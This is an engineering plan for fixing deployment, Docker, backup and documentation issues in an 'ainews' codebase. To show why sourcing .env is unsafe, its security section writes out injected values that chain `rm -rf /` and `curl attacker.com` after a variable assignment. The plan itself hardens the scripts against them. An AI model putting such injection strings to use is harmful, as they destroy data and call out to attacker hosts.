# Plan 5: Backend, Tech Stack, Docker, and Documentation Improvements

## Executive Summary

This plan addresses 19 identified issues across the ainews codebase, focusing on:
- **Security**: Fixing unsafe `.env` sourcing in deployment scripts
- **Correctness**: Fixing Celery healthcheck and backup race conditions
- **Performance**: Multi-stage Docker build for ~300MB size reduction
- **Reliability**: Adding validation checks to installation scripts
- **Documentation**: Consolidating duplicated content and updating placeholder URLs

**Priority Breakdown:**
- 🔴 High: 3 items (security & correctness issues)
- 🟡 Medium: 10 items (reliability & performance improvements)
- 🟢 Low: 6 items (polish & documentation)

---

## 🔴 HIGH PRIORITY

### 1. Fix Wrong Celery Healthcheck in docker-compose.yml

**Problem:** Lines 56 and 78 use `redis-cli -h redis ping` which only checks Redis connectivity, not whether Celery workers are actually running and responsive.

**Current Code (WRONG):**
```yaml
# celery-worker (line 56):
healthcheck:
  test: ["CMD-SHELL", "redis-cli -h redis ping"]
  interval: 30s
  timeout: 5s
  retries: 3
  start_period: 10s

# celery-beat (line 78) - identical check:
healthcheck:
  test: ["CMD-SHELL", "redis-cli -h redis ping"]
  interval: 30s
  timeout: 5s
  retries: 3
  start_period: 10s
```

**Fix for celery-worker:**
```yaml
celery-worker:
  # ... existing config ...
  healthcheck:
    test: ["CMD-SHELL", "celery -A celery_app:celery_app inspect ping -b redis://redis:6379/0 --timeout 5 2>/dev/null | grep -q OK"]
    interval: 30s
    timeout: 10s
    retries: 3
    start_period: 10s
```

**Fix for celery-beat:**
```yaml
celery-beat:
  # Add --pidfile to command (line 64):
  command: celery -A celery_app:celery_app beat -l info --schedule=/app/instance/celerybeat-schedule --pidfile=/tmp/celerybeat.pid
  # Update healthcheck:
  healthcheck:
    test: ["CMD-SHELL", "test -f /tmp/celerybeat.pid && kill -0 $$(cat /tmp/celerybeat.pid) 2>/dev/null"]
    interval: 30s
    timeout: 10s
    retries: 3
    start_period: 10s
```

**Why:** Celery beat doesn't respond to `inspect ping` (it's a scheduler only). Using PID file verification is the correct approach.

**Files to modify:** `docker-compose.yml`

---

### 2. Replace Placeholder GitHub URL

**Problem:** 10 occurrences of `https://github.com/yourorg/ainews.git` across 8 files. No git remote configured to determine actual URL.

**Occurrences:**
| File | Line | Context |
|------|------|---------|
| `README.md` | 8 | Docker quick start clone URL |
| `README.md` | 22 | Bare metal quick start clone URL |
| `docs/deployment.md` | 15 | Quick deploy clone URL |
| `docs/deployment.md` | 156 | Manual setup clone URL |
| `docs/development.md` | 16 | Dev environment setup |
| `docs/quickstart.md` | 52 | Setup section clone URL |
| `scripts/install.sh` | 11 | `REPO_URL` default variable |
| `systemd/ainews-web.service` | 3 | Documentation URL |
| `systemd/ainews-celery-worker.service` | 3 | Documentation URL |
| `systemd/ainews-celery-beat.service` | 3 | Documentation URL |

**Action:** Determine actual repository URL and replace all occurrences. For clone URLs use `https://github.com/ACTUAL-ORG/ainews.git`. For Documentation URLs use `https://github.com/ACTUAL-ORG/ainews`.

**Command to find actual URL (if in git repo):**
```bash
git remote get-url origin
```

**Files to modify:** All 8 files listed above.

---

### 3. Fix Unsafe .env Sourcing in deploy.sh

**Problem:** Line 183 `source "$APP_DIR/.env"` executes the `.env` file as bash code. If `.env` contains malicious content (e.g., `SECRET_KEY="value" ; rm -rf /`), it executes as root.

**Current Code (UNSAFE):**
```bash
# Line 183 in deploy.sh
source "$APP_DIR/.env"
```

**Fix:** Replace with line-by-line parser that treats `.env` as data:
```bash
# Safe .env loading function
load_env_file() {
    local env_file="${1:-.env}"
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip comments and empty lines
        [[ "$key" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${key// }" ]] && continue
        # Remove surrounding quotes from value
        if [[ "$value" =~ ^\"(.*)\"$ ]]; then
            value="${BASH_REMATCH[1]}"
        elif [[ "$value" =~ ^\'(.*)\'$ ]]; then
            value="${BASH_REMATCH[1]}"
        fi
        # Set variable without shell interpretation
        printf -v "$key" '%s' "$value" 2>/dev/null || continue
        export "$key"
    done < "$env_file"
}

load_env_file "$APP_DIR/.env"
```

**Also fix `install.sh` line 199:**
```bash
# UNSAFE: sudo -u "$APP_USER" env $(grep -v '^#' "$APP_DIR/.env" | xargs) \

# SAFE: Build env args as an array
env_args=()
while IFS='=' read -r key value || [[ -n "$key" ]]; do
    [[ "$key" =~ ^[[:space:]]*# ]] && continue
    [[ -z "${key// }" ]] && continue
    if [[ "$value" =~ ^\"(.*)\"$ ]]; then
        value="${BASH_REMATCH[1]}"
    elif [[ "$value" =~ ^\'(.*)\'$ ]]; then
        value="${BASH_REMATCH[1]}"
    fi
    env_args+=("$key=$value")
done < "$APP_DIR/.env"

sudo -u "$APP_USER" env "${env_args[@]}" \
    "$APP_DIR/.venv/bin/python" -c "..."
```

**Why:** The `source` command executes `.env` as bash script. Malicious lines like `SECRET_KEY="x" ; curl attacker.com` will execute. The `grep | xargs` approach corrupts values with spaces.

**Files to modify:** `scripts/deploy.sh`, `scripts/install.sh`

---

## 🟡 MEDIUM PRIORITY

### 4. Convert Dockerfile to Multi-Stage Build

**Problem:** Build dependencies (`build-essential`, `libxml2-dev`, `libxslt1-dev`, `libffi-dev`) remain in final image, estimated at ~550MB total.

**Current Dockerfile Issues:**
- Single stage with all build tools
- No virtualenv isolation
- Build cache not optimized

**Recommended Multi-Stage Dockerfile:**
```dockerfile
# Stage 1: Builder - compile dependencies
FROM python:3.12-slim AS builder

# Build dependencies only (will be discarded)
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    libxml2-dev \
    libxslt1-dev \
    libffi-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Install Python dependencies into a virtualenv
RUN python -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip \
    && pip install --no-cache-dir -r requirements.txt \
    && pip install --no-cache-dir "granian>=1.0.0,<2"

# Stage 2: Runtime - minimal image
FROM python:3.12-slim AS runtime

# Only runtime libraries needed
RUN apt-get update && apt-get install -y --no-install-recommends \
    libxml2 \
    libxslt1 \
    libffi \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the virtualenv from builder
COPY --from=builder /opt/venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

# Copy application code
COPY --chown=1000:1000 . .

# Create non-root user
RUN groupadd --gid 1000 ainews \
    && useradd --uid 1000 --gid 1000 --create-home ainews \
    && chown -R ainews:ainews /app

# Create data directories
RUN mkdir -p /app/instance /app/backups \
    && chown -R ainews:ainews /app/instance /app/backups

USER ainews

EXPOSE 5000

HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')" || exit 1

CMD ["granian", "--interface", "asgi", "--host", "0.0.0.0", "--port", "5000", "--workers", "2", "--threads", "4", "--access-log", "--log-level", "info", "run:app"]
```

**Estimated Savings:** ~300MB (55% reduction)

**Note:** Granian provides pre-built wheels for Linux x86_64 and ARM64 — no Rust compilation needed.

**File to modify:** `Dockerfile`

---

### 5. Fix Static Volume Mount Risk in docker-compose.yml

**Problem:** Line 30 `./static:/app/static:ro` overrides container's static files. If host `./static` is empty or missing, the app serves empty/missing static files.

**Current Code:**
```yaml
web:
  # ...
  volumes:
    - app-data:/app/instance
    - ./static:/app/static:ro  # PROBLEM: Overrides container files
```

**Fix:** Remove the static bind mount. The Dockerfile already copies static files into the image via `COPY . .`.

```yaml
web:
  # ...
  volumes:
    - app-data:/app/instance
    # Remove: - ./static:/app/static:ro
```

**For development live-reload:** Create `docker-compose.override.yml`:
```yaml
services:
  web:
    volumes:
      - ./static:/app/static:ro
```

**File to modify:** `docker-compose.yml`

---

### 6. Add Resource Limits to docker-compose.yml

**Problem:** No resource constraints defined. Services can exhaust host memory. The systemd services have `MemoryMax=1G` but Docker services have no limits.

**Recommended Limits:**
```yaml
services:
  web:
    # ... existing config ...
    mem_limit: 1g
    cpus: 2.0
    stop_grace_period: 30s  # Allow Granian time to finish in-flight requests

  celery-worker:
    # ... existing config ...
    mem_limit: 1.5g
    cpus: 2.0

  celery-beat:
    # ... existing config ...
    mem_limit: 256m
    cpus: 0.5

  redis:
    image: redis:7-alpine
    command: redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru
    mem_limit: 300m
    cpus: 0.5
    # ... existing config ...
```

**File to modify:** `docker-compose.yml`

---

### 7. Fix Plaintext Password Fallback in install.sh

**Problem:** Lines 148-150 store plaintext password in `.env` if hashing fails, with only a warning.

**Current Code:**
```bash
ADMIN_PASS_HASHED=$(sudo -u "$APP_USER" "$APP_DIR/.venv/bin/python" "$APP_DIR/scripts/hash_password.py" "$ADMIN_PASS" 2>/dev/null | grep "ADMIN_PASSWORD=" | cut -d= -f2-)
if [[ -n "$ADMIN_PASS_HASHED" ]]; then
    sed -i "s|^ADMIN_PASSWORD=.*|ADMIN_PASSWORD=$ADMIN_PASS_HASHED|" "$APP_DIR/.env"
else
    sed -i "s/^ADMIN_PASSWORD=.*/ADMIN_PASSWORD=$ADMIN_PASS/" "$APP_DIR/.env"  # PLAINTEXT!
    log_warn "Could not hash password — stored as plaintext."
fi
```

**Fix:** Fail hard instead of storing plaintext:
```bash
ADMIN_PASS_HASHED=$(sudo -u "$APP_USER" "$APP_DIR/.venv/bin/python" "$APP_DIR/scripts/hash_password.py" "$ADMIN_PASS" 2>/dev/null | grep "ADMIN_PASSWORD=" | cut -d= -f2-)
if [[ -n "$ADMIN_PASS_HASHED" ]]; then
    sed -i "s|^ADMIN_PASSWORD=.*|ADMIN_PASSWORD=$ADMIN_PASS_HASHED|" "$APP_DIR/.env"
else
    log_error "Failed to hash admin password. Install bcrypt/scrypt support: pip install bcrypt"
    exit 1
fi
```

**File to modify:** `scripts/install.sh`

---

### 8. Add Validation Checks to install.sh

**Problem:** Script has `set -euo pipefail` but uses `|| true` patterns that mask failures. No validation that critical operations succeeded.

**Critical Operations Needing Validation:**

**A. User/Group Creation (lines 62-68):**
```bash
log_info "Creating system user and group..."
if ! id "$APP_USER" &>/dev/null; then
    if useradd --system --shell /bin/false --home-dir "$APP_DIR" --create-home "$APP_USER" 2>&1; then
        log_info "Created user: $APP_USER"
    else
        log_error "Failed to create user: $APP_USER"
        exit 1
    fi
else
    log_warn "User $APP_USER already exists"
fi
```

**B. Package Installation (lines 73-83):**
```bash
log_info "Installing system dependencies..."
if command -v apt-get &>/dev/null; then
    apt-get update || { log_error "apt-get update failed"; exit 1; }
    apt-get install -y python3.12 python3.12-venv redis-server nginx git || { log_error "Failed to install packages"; exit 1; }
# ... dnf/yum equivalents ...
else
    log_error "Unsupported package manager"
    exit 1
fi
```

**C. Git Clone (lines 95-107):**
```bash
if [[ -d "$APP_DIR/.git" ]]; then
    cd "$APP_DIR" || { log_error "Failed to cd to $APP_DIR"; exit 1; }
    if ! sudo -u "$APP_USER" git pull; then
        log_error "Git pull failed"
        exit 1
    fi
else
    if ! git clone "$REPO_URL" "$APP_DIR"; then
        log_error "Git clone failed for $REPO_URL"
        exit 1
    fi
fi
```

**D. Redis Enable/Start (lines 88-90):**
```bash
systemctl enable redis-server 2>/dev/null || systemctl enable redis 2>/dev/null || true
systemctl start redis-server 2>/dev/null || systemctl start redis 2>/dev/null || true

# Verify Redis is running
if systemctl is-active --quiet redis-server 2>/dev/null || systemctl is-active --quiet redis 2>/dev/null; then
    log_info "Redis is running"
else
    log_warn "Redis is NOT running. Check: systemctl status redis-server"
fi
```

**File to modify:** `scripts/install.sh`

---

### 9. Align Granian Worker Count

**Problem:** Inconsistency between Dockerfile (2 workers) and systemd (4 workers). Granian recommends 1 worker per container for Docker.

**Current State:**
| Location | Workers | Threads |
|----------|---------|---------|
| Dockerfile | 2 | 4 |
| systemd | 4 | 4 |

**Recommendation:** Align with Granian best practices:
- **Dockerfile:** Change to `--workers 1` (per container recommendation)
- **systemd:** Keep 4 if server has 4+ cores, otherwise match CPU count (not `2×+1` which is Gunicorn formula)

**Fix for Dockerfile:**
```dockerfile
CMD ["granian", "--interface", "asgi", "--host", "0.0.0.0", "--port", "5000", "--workers", "1", "--threads", "4", "--access-log", "--log-level", "info", "run:app"]
```

**Fix for systemd (update `docs/deployment.md` line 211):**
Change formula from `(2 × CPU_CORES) + 1` (Gunicorn) to match CPU cores (Granian recommendation).

**Files to modify:** `Dockerfile`, `systemd/ainews-web.service`, `docs/deployment.md`

---

### 10. Add stop_grace_period (Not STOPSIGNAL)

**Finding:** Docker already sends SIGTERM by default. Granian handles SIGTERM gracefully (waits for in-flight requests). No custom STOPSIGNAL needed.

**Fix:** Add `stop_grace_period: 30s` to web service (default is 10s):
```yaml
web:
  # ... existing config ...
  stop_grace_period: 30s  # Override default 10s for graceful shutdown
```

**File to modify:** `docker-compose.yml`

---

### 11. Add `deploy` Target to Makefile

**Problem:** `scripts/deploy.sh` exists but has no Makefile target.

**Current Makefile:** Missing `deploy`, `migrate`, `format` targets.

**Add to Makefile:**
```makefile
deploy: ## Deploy to production via deploy.sh
	bash scripts/deploy.sh

deploy-rollback: ## Rollback the previous deployment
	bash scripts/deploy.sh --rollback

migrate: ## Run database migrations
	.venv/bin/flask db upgrade

format: ## Format code with ruff
	.venv/bin/ruff format .

status: ## Check development services status
	bash scripts/dev.sh status
```

**File to modify:** `Makefile`

---

### 12. Fix backup.sh Fallback Method

**Problem:** Lines 38-51 use Python WAL checkpoint then `cp` command. Race condition: new writes can occur between checkpoint and copy.

**Current Fallback Code (WRONG):**
```bash
# Line 40-45: Checkpoint runs
python3 -c "conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')"

# Line 46: Copy happens AFTER checkpoint (race condition)
cp "$DB_PATH" "$BACKUP_FILE"
```

**Fix:** Remove fallback entirely. Require `sqlite3` CLI:
```bash
if ! command -v sqlite3 &>/dev/null; then
    echo "ERROR: sqlite3 CLI not found - required for safe backup"
    exit 1
fi

# Use SQLite Backup API (atomic, consistent snapshot)
sqlite3 "$DB_PATH" ".backup $BACKUP_FILE"
```

**Why:** `sqlite3 .backup` uses SQLite Backup API which acquires proper locks and creates consistent snapshot. The `cp` approach can copy inconsistent state.

**File to modify:** `scripts/backup.sh`

---

### 13. Update verify_backup.sh Tables

**Problem:** Only checks 5 tables, but `models.py` defines 18 tables.

**Current REQUIRED_TABLES:**
```bash
REQUIRED_TABLES=("articles" "sources" "tags" "subscribers" "newsletters")
```

**Updated REQUIRED_TABLES (all 18 tables):**
```bash
REQUIRED_TABLES=(
    "article_tags" "sources" "tags" "articles" "citations"
    "newsletters" "subscribers" "article_metrics" "share_configs"
    "pipeline_runs" "pipeline_logs" "article_versions"
    "topic_notes" "trend_memory" "webhooks" "webhook_events"
    "audit_logs" "search_queries"
)
```

**Also add row count sanity checks:**
```bash
# Check for critical tables having reasonable row counts
MIN_ROW_TABLES=("articles" "sources" "tags")
for table in "${MIN_ROW_TABLES[@]}"; do
    count=$(sqlite3 "$DB_CHECK" "SELECT count(*) FROM '$table';")
    if [[ "$count" -eq 0 ]]; then
        echo "WARN: Table '$table' has 0 rows in backup (may be expected for new installs)"
    fi
done
```

**File to modify:** `scripts/verify_backup.sh`

---

## 🟢 LOW PRIORITY

### 14. Consolidate Documentation

**Problem:** Duplicated content between `docs/quickstart.md` and `docs/deployment.md`:
- Nginx config appears 3 times in deployment.md
- LLM provider setup in both quickstart.md and configuration.md

**Fix for Nginx config in deployment.md:**
Consolidate 3 copies into 1 common config with notes for Docker vs bare metal path differences.

**Fix for LLM providers:**
Keep details in `configuration.md` only. Add brief mention + link in `quickstart.md`:
```markdown
### LLM Providers
By default, ainews uses Ollama (local). To configure OpenAI, Anthropic, or other providers, see [Configuration Reference - LLM Providers](configuration.md#llm-providers).
```

**Files to modify:** `docs/deployment.md`, `docs/quickstart.md`

---

### 15. .dockerignore Already Complete ✅

**Finding:** `dist/`, `build/`, `*.egg-info/` already present (lines 6-8). No action needed.

---

### 16. Add Logging Driver Config to docker-compose.yml

**Problem:** No log rotation. Containers can fill disk.

**Fix:**
```yaml
services:
  web:
    # ... existing config ...
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  # Apply to all services...
```

**File to modify:** `docker-compose.yml`

---

### 17. Fix deploy.sh Hardcoded Health Check Port

**Problem:** Line 220 hardcodes `http://127.0.0.1:5000/health`. Should read from `$PORT` env var.

**Fix:**
```bash
# Line 220 in deploy.sh
HEALTH_CHECK_URL="http://127.0.0.1:${PORT:-5000}/health"
```

**Also add timeout to curl:**
```bash
if curl -sf --max-time 10 "$HEALTH_CHECK_URL" > /dev/null; then
    log_info "Health check passed"
else
    log_error "Health check failed at $HEALTH_CHECK_URL"
fi
```

**File to modify:** `scripts/deploy.sh`

---

### 18. Add Rollback Validation in deploy.sh

**Problem:** `.last_deploy_commit` can be corrupted/empty. No validation before using.

**Fix A - Save full hash (line 119):**
```bash
# Don't use --short
CURRENT_COMMIT=$(sudo -u "$APP_USER" git rev-parse HEAD)
echo "$CURRENT_COMMIT" > .last_deploy_commit
```

**Fix B - Validate before rollback (lines 65-68):**
```bash
PREV_COMMIT=$(cat .last_deploy_commit | tr -d '[:space:]')

# Validate it looks like a commit hash (40 hex chars or short 7+)
if ! [[ "$PREV_COMMIT" =~ ^[0-9a-f]{7,40}$ ]]; then
    log_error "Invalid commit hash in .last_deploy_commit: $PREV_COMMIT"
    exit 1
fi

# Verify it's a valid commit
if ! sudo -u "$APP_USER" git rev-parse --verify "$PREV_COMMIT" &>/dev/null; then
    log_error "Commit $PREV_COMMIT not found in repository"
    exit 1
fi

sudo -u "$APP_USER" git checkout "$PREV_COMMIT"
```

**Also stop services before rollback checkout.**

**File to modify:** `scripts/deploy.sh`

---

### 19. Fix deploy.sh Remote Origin Assumption

**Problem:** Line 145 `git pull origin "$CURRENT_BRANCH"` assumes remote is named "origin".

**Fix:**
```bash
REMOTE="${DEPLOY_REMOTE:-origin}"

# Validate remote exists
if ! sudo -u "$APP_USER" git remote get-url "$REMOTE" &>/dev/null; then
    log_error "Remote '$REMOTE' not configured. Set DEPLOY_REMOTE env var."
    exit 1
fi

sudo -u "$APP_USER" git fetch "$REMOTE"
sudo -u "$APP_USER" git pull "$REMOTE" "$CURRENT_BRANCH"
```

**File to modify:** `scripts/deploy.sh`

---

## Implementation Order

### Phase 1: High Priority (Security & Correctness)
1. Fix unsafe `.env` sourcing in `deploy.sh` and `install.sh`
2. Fix Celery healthcheck in `docker-compose.yml`
3. Replace placeholder GitHub URLs (requires determining actual URL first)

### Phase 2: Medium Priority (Reliability & Performance)
4. Convert Dockerfile to multi-stage build
5. Add resource limits to `docker-compose.yml`
6. Fix static volume mount risk
7. Add `stop_grace_period`
8. Add validation checks to `install.sh`
9. Fix plaintext password fallback
10. Fix backup.sh fallback method
11. Update verify_backup.sh tables
12. Align Granian worker count
13. Add `deploy` target to Makefile

### Phase 3: Low Priority (Polish)
14. Consolidate documentation
15. Add logging driver config
16. Fix deploy.sh minor issues (port, rollback, remote)
17. Verify .dockerignore (already complete)

---

## Testing Strategy

After each phase:

1. **For Docker changes:**
   ```bash
   docker compose build
   docker compose up -d
   docker compose ps  # Verify healthchecks pass
   ```

2. **For script changes:**
   ```bash
   # Test install.sh in clean environment
   bash scripts/install.sh

   # Test deploy.sh (without --rollback first)
   bash scripts/deploy.sh
   ```

3. **For Granian changes:**
   ```bash
   # Verify workers start correctly
   granian --interface asgi --workers 1 --threads 4 run:app
   curl http://localhost:5000/health
   ```

4. **Run lint and tests:**
   ```bash
   .venv/bin/ruff check . --exclude .venv
   .venv/bin/python -m pytest tests/ -x -q
   ```

---

## Rollback Plan

1. **For script changes:** Keep backups of original scripts
2. **For Docker changes:** Previous image will still be available via `docker images`
3. **For documentation:** Git history preserves previous versions
4. **For .env changes:** The new parsing is backwards-compatible with standard `.env` formats

---

## Summary

| Priority | Items | Est. Time |
|----------|-------|-----------|
| High | 3 | 2-3 hours |
| Medium | 10 | 4-6 hours |
| Low | 6 | 2-3 hours |
| **Total** | **19** | **8-12 hours** |

**Note:** Item 15 (.dockerignore) is already complete — no action needed.
